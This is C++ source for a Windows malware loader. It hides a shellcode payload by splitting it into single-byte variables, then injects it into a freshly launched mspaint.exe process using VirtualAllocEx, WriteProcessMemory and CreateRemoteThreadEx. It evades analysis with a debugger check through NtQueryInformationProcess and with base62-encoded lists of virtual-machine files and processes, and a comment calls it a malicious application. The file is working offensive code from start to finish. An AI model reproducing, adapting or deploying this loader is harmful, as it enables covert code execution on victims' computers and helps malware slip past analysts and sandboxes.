#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <gmp.h>

#include <iostream>
#include <format>
#include <vector>
#include <fstream>

using namespace std;
const string BASE62_CHARACTERS = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;

string base62Decode(const string& input) {
    mpz_t value;
    mpz_init(value);
    
    for (char c : input) {
        size_t index = BASE62_CHARACTERS.find(c);
        
        mpz_mul_ui(value, value, 62);
        mpz_add_ui(value, value, static_cast<unsigned char>(index));
    }

    string result;
    while (mpz_cmp_ui(value, 0) > 0) {
        result = static_cast<char>(mpz_fdiv_ui(value, 256)) + result;
        mpz_fdiv_q_ui(value, value, 256);
    }

    mpz_clear(value);

    return result;
}

bool isBeingDebugged() {
    // I did not want to use IsDebuggerPresent()
    // https://0xpat.github.io/Malware_development_part_3/

    typedef NTSTATUS(WINAPI *PNtQueryInformationProcess)(IN  HANDLE, IN  PROCESSINFOCLASS, OUT PVOID, IN ULONG, OUT PULONG);
    PNtQueryInformationProcess pNtQueryInformationProcess = (PNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
    DWORD64 isDebuggerPresent = 0;
    pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &isDebuggerPresent, sizeof(DWORD64), NULL);
    if (isDebuggerPresent){
        MessageBoxA(
                    NULL,
                    base62Decode("mej57TQYQQGZ78aNDWn14RkbYPbRW93J2V9YjfGeyaLSnHLRK21FP4HiKE4GAn3hyd7VruUm6XcxZra").c_str(),
                    base62Decode("2HyoIe7F1hy6xDKEGA").c_str(),
                    MB_OK | MB_ICONWARNING
        );
        return true;
    }
    return false;
}

void stringToUnsignedCharArray(const string& input, unsigned char output[]) {
    for (size_t i = 0; i < input.size(); ++i) {
        output[i] = static_cast<unsigned char>(input[i]);
    }
}

string please_work() {
    string var0 = "\x78";
    string var1 = "\x5d";
    string var2 = "\x65";
    string var3 = "\x39";
    string var4 = "\xa8";
    string var5 = "\x77";
    string var6 = "\xd8";
    string var7 = "\x59";
    string var8 = "\x83";
    string var9 = "\x67";
    string var10 = "\x28";
    string var11 = "\x53";
    string var12 = "\xcc";
    string var13 = "\x26";
    string var14 = "\xc2";
    string var15 = "\x33";
    string var16 = "\x5f";
    string var17 = "\xd9";
    string var18 = "\x49";
    string var19 = "\xe5";
    string var20 = "\xbc";
    string var21 = "\x99";
    string var22 = "\xe9";
    string var23 = "\x10";
    string var24 = "\x38";
    string var25 = "\xf0";
    string var26 = "\x3c";
    string var27 = "\xa5";
    string var28 = "\x42";
    string var29 = "\x31";
    string var30 = "\xe3";
    string var31 = "\x58";
    string var32 = "\xff";
    string var33 = "\x18";
    string var34 = "\x7e";
    string var35 = "\x50";
    string var36 = "\x08";
    string var37 = "\xa0";
    string var38 = "\xd6";
    string var39 = "\x30";
    string var40 = "\x4a";
    string var41 = "\xf6";
    string var42 = "\x48";
    string var43 = "\x32";
    string var44 = "\x51";
    string var45 = "\xb7";
    string var46 = "\xa4";
    string var47 = "\xe8";
    string var48 = "\x72";
    string var49 = "\xc3";
    string var50 = "\xc4";
    string var51 = "\x6e";
    string var52 = "\xea";
    string var53 = "\x66";
    string var54 = "\x74";
    string var55 = "\x0c";
    string var56 = "\xda";
    string var57 = "\xd2";
    string var58 = "\x68";
    string var59 = "\x34";
    string var60 = "\x12";
    string var61 = "\x81";
    string var62 = "\x57";
    string var63 = "\xe0";
    string var64 = "\x2a";
    string var65 = "\x93";
    string var66 = "\x52";
    string var67 = "\x73";
    string var68 = "\xbb";
    string var69 = "\xbe";
    string var70 = "\x0f";
    string var71 = "\x06";
    string var72 = "\xf8";
    string var73 = "\xe7";
    string var74 = "\xc9";
    string var75 = "\x61";
    string var76 = "\x8b";
    string var77 = "\xfc";
    string var78 = "\xc7";
    string var79 = "\x04";
    string var80 = "\xce";
    string var81 = "\xdf";
    string var82 = "\x03";
    string var83 = "\x6b";
    string var84 = "\x2f";
    string var85 = "\x75";
    string var86 = "\x20";
    string var87 = "\x45";
    string var88 = "\xc8";
    string var89 = "\x01";
    string var90 = "\x4c";
    string var91 = "\xc6";
    string var92 = "\x24";
    string var93 = "\x5e";
    string var94 = "\xac";
    string var95 = "\x7c";
    string var96 = "\x88";
    string var97 = "\x89";
    string var98 = "\xf9";
    string var99 = "\x5a";
    string var100 = "\x0b";
    string var101 = "\x6a";
    string var102 = "\x2c";
    string var103 = "\xc0";
    string var104 = "\x44";
    string var105 = "\x0d";
    string var106 = "\x0a";
    string var107 = "\x80";
    string var108 = "\x4b";
    string var109 = "\xf2";
    string var110("\0", 1); /* \x00 */
    string var111 = "\xe2";
    string var112 = "\xb4";
    string var113 = "\x56";
    string var114 = "\xd1";
    string var115 = "\x29";
    string var116 = "\x7d";
    string var117 = "\xe6";
    string var118 = "\x54";
    string var119 = "\xba";
    string var120 = "\xd0";
    string var121 = "\x85";
    string var122 = "\x60";
    string var123 = "\x55";
    string var124 = "\xc1";
    string var125 = "\xed";
    string var126 = "\x07";
    string var127 = "\xec";
    string var128 = "\x4d";
    string var129 = "\x1c";
    string var130 = "\xf1";
    string var131 = "\x02";
    string var132 = "\xe4";
    string var133 = "\x1d";
    string var134 = "\xd5";
    string var135 = "\x40";
    string var136 = "\x41";
    string shc = format("{77}{42}{8}{132}{25}{47}{12}{110}{110}{110}{136}{44}{136}{35}{66}{42}{29}{57}{44}{113}{2}{42}{76}{66}{122}{42}{76}{66}{33}{42}{76}{66}{86}{42}{70}{45}{40}{40}{42}{76}{48}{35}{128}{29}{74}{42}{29}{103}{94}{26}{75}{95}{131}{102}{86}{136}{124}{74}{105}{136}{89}{124}{111}{125}{66}{136}{44}{42}{76}{66}{86}{76}{28}{26}{42}{89}{120}{53}{61}{0}{33}{100}{131}{70}{121}{48}{110}{110}{110}{76}{107}{96}{110}{110}{110}{42}{121}{103}{54}{9}{42}{89}{120}{35}{76}{42}{33}{104}{76}{135}{86}{18}{89}{120}{30}{113}{42}{32}{74}{128}{29}{74}{136}{76}{59}{96}{42}{89}{38}{42}{29}{103}{94}{136}{124}{74}{105}{136}{89}{124}{24}{63}{85}{130}{90}{82}{90}{92}{36}{87}{3}{114}{85}{6}{31}{104}{76}{135}{92}{18}{89}{120}{53}{136}{76}{55}{42}{104}{76}{135}{129}{18}{89}{120}{136}{76}{79}{96}{42}{89}{120}{136}{31}{136}{31}{93}{7}{99}{136}{31}{136}{7}{136}{99}{42}{8}{127}{86}{136}{66}{32}{63}{31}{136}{7}{99}{42}{76}{60}{22}{108}{32}{32}{32}{1}{18}{69}{5}{67}{43}{16}{15}{43}{110}{110}{136}{113}{18}{97}{117}{42}{61}{127}{37}{89}{110}{110}{18}{97}{19}{18}{20}{131}{110}{89}{68}{103}{4}{71}{121}{136}{118}{18}{97}{132}{90}{97}{130}{136}{119}{90}{5}{13}{126}{32}{134}{90}{97}{52}{58}{89}{89}{110}{110}{7}{136}{119}{115}{107}{83}{110}{32}{134}{101}{106}{136}{93}{35}{35}{128}{29}{74}{128}{29}{103}{42}{32}{103}{42}{97}{14}{42}{32}{103}{42}{97}{124}{136}{119}{52}{70}{81}{63}{32}{134}{42}{97}{78}{101}{23}{136}{31}{90}{97}{111}{42}{97}{98}{136}{119}{21}{27}{54}{75}{32}{134}{121}{103}{54}{106}{18}{32}{80}{85}{19}{47}{65}{110}{110}{110}{42}{8}{127}{23}{42}{97}{111}{128}{29}{74}{101}{79}{136}{31}{42}{97}{98}{136}{119}{131}{17}{88}{16}{32}{134}{8}{72}{110}{34}{123}{42}{8}{50}{86}{93}{97}{41}{101}{135}{136}{7}{58}{110}{23}{110}{110}{136}{31}{42}{97}{109}{42}{29}{74}{136}{119}{31}{46}{11}{19}{32}{134}{42}{97}{49}{18}{97}{78}{128}{29}{74}{18}{97}{25}{42}{97}{56}{42}{97}{98}{136}{119}{131}{17}{88}{16}{32}{134}{8}{72}{110}{116}{10}{31}{136}{62}{7}{58}{110}{135}{110}{110}{136}{31}{101}{110}{99}{136}{119}{100}{84}{70}{39}{32}{134}{62}{7}{136}{119}{85}{51}{128}{75}{32}{134}{18}{32}{80}{22}{26}{32}{32}{32}{42}{89}{49}{42}{115}{91}{42}{121}{41}{85}{112}{136}{32}{73}{31}{101}{110}{7}{68}{63}{133}{64}{106}{136}{97}{56}{32}{134}", var0, var1, var2, var3, var4, var5, var6, var7, var8, var9, var10, var11, var12, var13, var14, var15, var16, var17, var18, var19, var20, var21, var22, var23, var24, var25, var26, var27, var28, var29, var30, var31, var32, var33, var34, var35, var36, var37, var38, var39, var40, var41, var42, var43, var44, var45, var46, var47, var48, var49, var50, var51, var52, var53, var54, var55, var56, var57, var58, var59, var60, var61, var62, var63, var64, var65, var66, var67, var68, var69, var70, var71, var72, var73, var74, var75, var76, var77, var78, var79, var80, var81, var82, var83, var84, var85, var86, var87, var88, var89, var90, var91, var92, var93, var94, var95, var96, var97, var98, var99, var100, var101, var102, var103, var104, var105, var106, var107, var108, var109, var110, var111, var112, var113, var114, var115, var116, var117, var118, var119, var120, var121, var122, var123, var124, var125, var126, var127, var128, var129, var130, var131, var132, var133, var134, var135, var136);

    return shc;
}

int attack() {
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    if(!CreateProcessW(
        L"C:\\Windows\\System32\\mspaint.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        BELOW_NORMAL_PRIORITY_CLASS,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        return EXIT_FAILURE;
    }

    PID = pi.dwProcessId;
    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        PID
    );
    if(!hProcess) {
        return EXIT_FAILURE;
    }

    string str = please_work();
    unsigned char shell_code[str.length()] = {};
    stringToUnsignedCharArray(str, shell_code);

    /**
     * Allocate bytes to process memory
    */
    rBuffer = VirtualAllocEx(
        hProcess,
        NULL, // Pointer to the start address of the region of pages
        sizeof(shell_code),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    /**
     * Write allocated memory to process memory
    */
    WriteProcessMemory(hProcess, rBuffer, shell_code, sizeof(shell_code), NULL);

    /**
     * create thread to run payload
    */
    hThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE) rBuffer,
        NULL,
        0,
        0,
        &TID
    );

    if (hThread == NULL) {
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    WaitForSingleObject(hThread, INFINITE);

    /**
     * Closing up
    */
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return EXIT_SUCCESS;
}

bool isProcessRunning(const string& processName) {

    // Getting snapshot of current processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return false;
    }

    // Initialize the process entry structure
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // Iterate through processes to find the target process
    if (Process32First(hSnapshot, &processEntry)) {
        do {
            if (strcmp(processName.c_str(), processEntry.szExeFile) == 0) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &processEntry));
    }

    CloseHandle(hSnapshot);
    return false;
}

bool isVM() {
    /*
    Limited resources - a sandbox may not be able to run long and consuming simulations in parallel 
    so is often restricts resources commited and time allocated for a single instance. 
    
    Typical user workstation has a processor with at least 2 cores, a minimum of 2 GB of RAM and a 100 GB hard drive. 
    We can verify if the environment our malicious application is being executed in is a subject to these constrains:

    this approach not applied sice it felt like cheating
    */

    // Checking for vm files
    vector<string> vm_files = {
        base62Decode("6PpFseU2C0hMJ8npXNJ4kqfQIUVW9t9EYrJmaa4JRdM2lyZXI4GjxxvbL1"),
        base62Decode("1YLcEgk1V0AV4dQbBTNVfNPX0bQ2SYBRGBwYX4rM976nrc2ZLRrI9xUNg"),
        base62Decode("NKjaUh78xcNzfW74ENcBTP4bRT4TC9YD7jfIfNZsWEj0sH8qSKo6aA0"),
        base62Decode("NKjaUh78xcNzfW74ENcBTP4bRT4TC9Yd2Gkm3Cuo5QRT0qtLk39fTCe"),
        base62Decode("20Cw9tDKuzClWy0ByN6boOVBiedp0ONOEesf4PNiASBQZpshprTborsj11Cw6X9Zs"),
        base62Decode("KYC64ffeqkAwRkOXKEOQ0tnRhFIfY5Ozne1Vt5R4rtmsh4mVWEv"),
        base62Decode("Y9cZwUeA4DIcka1E8dsQrNMVogKDrLax1B0QvS3phC2i5MiMsnEnv69pbYYJNcU70oe"),
        base62Decode("5eNdLxqaYmWw2mwrox02mIBHmnBFmxT73KGIZCyW6U5tuuCtjDoOJI"),
        base62Decode("6PpFseU2C0hMJ8npXNJ4kqfQIUVW9t9EYrJmaa4JRdM5tN4bwsKrTq0wZg"),
        base62Decode("1YLcEgk1V0AV4dQbBTNVfNPX0bQ2SYBRGBwYX4rM976nrc89d3uKijtkK"),
        base62Decode("U54OfwvrWGAXegfeIBluHYg4W7hpvFLJYEJdwavYkVDrcQGlmeTCbHxRVBBJ85U"),
        base62Decode("1lOVfPFxMMqJEj3hpFfQygrPug6iKHdWDYm801E6hekq5iiMJVBWWCCJ15ENX"),
        base62Decode("1lOVfPFxMMqJEj3hpFfQygrPug6iKHdWDYm801E6hekq5iiMJT4A2112w7ej5"),
        base62Decode("1YLcEgk1V0AV4dQbBTNVfNPX0bQ2SYBRGBwYX4rM976n6WqmvSSpYhMNX"),
        base62Decode("1lOVfPFxMMqJEj3hpFfQygrPug6iKHdWDYm801E6hekq5iiMJYMoMcABVbnut"),
        base62Decode("5eNdLxqaYmWw2mwrox02mIBHmnBFmxTDKPMx6aY6JPjodEho42WVLw"),
        base62Decode("1YLcEgk1V0AV4dQbBTNVfNPX0bQ2SYBRGBwYX4rM976nrc77Wbzft4t6i"),
        base62Decode("I6EPL5wOZ2XFFy0zrOOJgta3Whr3U94S09BD3uRSDm7D8Sy"),
        base62Decode("I6EPL5wOZ2XFFy0zrOOJgta3Whr3U94S09BD4FrGcWRblRU"),
        base62Decode("1CjjUd6X7QgTGzvo7QSiPJ7UsZ354OTSNcbuHzLdVjtsfblqm"),
        base62Decode("4Nn1IBbsNz9zKorWQ0Zv53lxwmOxS80aoPTM3b2gpN4P6a"),
        base62Decode("I6EPL5wOZ2XFFy0zrOOJgta3Whr3U94S09BD5HnMJMyt0UP"),
        base62Decode("KYC64ffeqkAwRkOXKEOQ0tnRhFIfY5Ol7PcZdXccjeKx8uXhLvB"),
        base62Decode("7HhCkyHt6MJzQo3Ixch5OayZ01rj1kpB1zaj254FgGHSeMMJZvXDBtaKT7E0fU"),
        base62Decode("1YLcEgk1V0AV4dQbBTNVfNPX0bQ2SYBSzBNB8PFKYk0LGay6XLygcwjvQ"),
        base62Decode("1lOVfPFxMMqJEj3hpFfQygrPug6iKHdYB2RdChUILcOK0dpvmMmkZBBhtNfg4")
    };

    for (const string& filename : vm_files) {
        ifstream file(filename);
        
        if (file.good()) {
            MessageBoxA(
                NULL,
                base62Decode("mej57TQYQQGZ78aNDWn14RkbYPbRW93J2V9YjfGeyaLSnHLRK21FP4HiKE4GAn3hyd7VruUm6XcxZra").c_str(),
                base62Decode("2HyoIe7F1hy6xDKEGA").c_str(),
                MB_OK | MB_ICONWARNING
            );
            return true;
        }
        file.close();
    }

    // Checking for vm processes
    vector<string> vm_processes = {
        base62Decode("lfLcdKM8z3qTqD5B"),
        base62Decode("D6fU9qngF89eHdWJ6V3"),
        base62Decode("9Z4xbYFv0JxyV7Q6qPt"),
        base62Decode("AqE3RKrxrZZCWr5DSNpHoUH"),
        base62Decode("lfLAkoRHGARVrM2f"),
        base62Decode("YmmdU7tqofzccOsX"),
        base62Decode("s6JbO3O2D6eI73vbTwKT"),
        base62Decode("9av5U83ywWKHFGH")
    };
    for (const string& process : vm_processes) {
        if (isProcessRunning(process)) {
            MessageBoxA(
                NULL,
                base62Decode("mej57TQYQQGZ78aNDWn14RkbYPbRW93J2V9YjfGeyaLSnHLRK21FP4HiKE4GAn3hyd7VruUm6XcxZra").c_str(),
                base62Decode("2HyoIe7F1hy6xDKEGA").c_str(),
                MB_OK | MB_ICONWARNING
            );
            return true;
        }
    }

    return false;
}

int main(int argc, char* argv[]) {
    if(isBeingDebugged()) return EXIT_FAILURE;
    if (isVM()) return EXIT_FAILURE;
    
    return attack();
}